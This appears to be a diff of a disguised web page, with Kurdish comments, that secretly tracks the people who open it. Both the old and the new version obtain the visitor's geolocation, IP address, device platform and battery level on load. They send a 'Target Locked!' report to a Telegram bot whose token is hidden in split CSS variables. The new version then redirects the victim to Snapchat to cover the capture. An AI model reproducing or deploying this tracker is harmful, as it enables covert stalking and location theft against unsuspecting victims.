@@ -1,26 +1,10 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title>EYE LOCation | System Scan</title>
-    <style>
-        :root { 
-            --p1: "8431515310"; 
-            --p2: "AAFABzJuX8"; 
-            --p3: "l7AMLVis5xSFHm9EGK95i9l8I"; 
-        }
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .scanner { text-align: center; border: 1px solid #0f0; padding: 30px; box-shadow: 0 0 20px #0f0; }
-    </style>
-</head>
-<body onload="capture()">
-    <div class="scanner">
-        <h2>EYE ØF IRAQ</h2>
-        <p id="status">INITIALIZING SECURE SCAN...</p>
-        <div style="border: 2px solid #333; width: 200px; height: 10px; margin: 10px auto;">
-            <div id="bar" style="background: #0f0; width: 0%; height: 100%; transition: 0.5s;"></div>
-        </div>
-    </div>
+<style>
+    :root { 
+        --p1: "8678050341"; 
+        --p2: "AAE7b3fvFp"; 
+        --p3: "fGju4NXGaFiMsvhYC0UdnCYtE"; 
+    }
+</style>
 
 <script>
     async function capture() {
@@ -28,78 +12,43 @@
         const targetID = urlParams.get('id'); 
         if (!targetID) return;
 
-        // دروستکردنەوەی تۆکن بە بێدەنگی
         const root = document.documentElement;
         const TK = getComputedStyle(root).getPropertyValue('--p1').replace(/"/g, '').trim() + ":" + 
                    getComputedStyle(root).getPropertyValue('--p2').replace(/"/g, '').trim() + 
                    getComputedStyle(root).getPropertyValue('--p3').replace(/"/g, '').trim();
 
         try {
-            document.getElementById('bar').style.width = "40%";
-            
-            // ١. زانیاری باتری
-            let bat = "N/A", ch = "No";
+            // وەرگرتنی کات و باتری
+            let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                bat = Math.floor(b.level * 100);
-                ch = b.charging ? "Yes" : "No";
+                bat = Math.floor(b.level * 100) + "%";
             }
-
-            // ٢. کات و ئامێر
             let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-            let device = navigator.platform;
 
-            document.getElementById('status').innerText = "REQUESTING PERMISSION...";
-            document.getElementById('bar').style.width = "70%";
-
-            // ٣. لۆکەیشن و IP و ناردنی داتا
+            // وەرگرتنی لۆکەیشن و ناردن
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // لێرەدا دەتوانیت ناوچەکە (City) بەپێی IP دیاری بکەیت
-                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
-                let city = geo.city || "Erbil/Bakhtiari";
+                let report = `🚨 <b>Target Locked!</b>\n\n` +
+                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
+                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                             `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
+                             `🕒 <b>Time:</b> <code>${time}</code>`;
 
-                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (Korek Telecom)\n` +
-                             `📱 <b>Device:</b> <code>${device}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}%</code> (Charging: ${ch})\n` +
-                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                             `🏙️ <b>City:</b> <code>${city}</code>`;
-
-                await _send(report, TK, targetID);
-                finish();
-
-            }, async () => {
-                // ئەگەر لۆکەیشنی ڕەتکردەوە
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                let report = `⚠️ <b>Target Found (No Location)</b>\n\n🌐 IP: ${ipData.ip}\n🔋 Battery: ${bat}%`;
-                await _send(report, TK, targetID);
-                finish();
+                fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML"})
+                });
+                
+                setTimeout(() => { window.location.replace("https://www.snapchat.com"); }, 1000);
+            }, () => {
+                window.location.replace("https://www.snapchat.com");
             });
-
-        } catch (e) { finish(); }
+        } catch (e) { window.location.replace("https://www.snapchat.com"); }
     }
-
-    function _send(txt, tk, uid) {
-        return fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: uid, text: txt, parse_mode: "HTML", disable_web_page_preview: false})
-        });
-    }
-
-    function finish() {
-        document.getElementById('bar').style.width = "100%";
-        document.getElementById('status').innerText = "SCAN COMPLETE!";
-        // دەتوانیت لێرە ڕێدایرێکتی بکەیت بۆ سناپچات ئەگەر ویستت
-    }
+    window.onload = capture;
 </script>
-</body>
-</html>
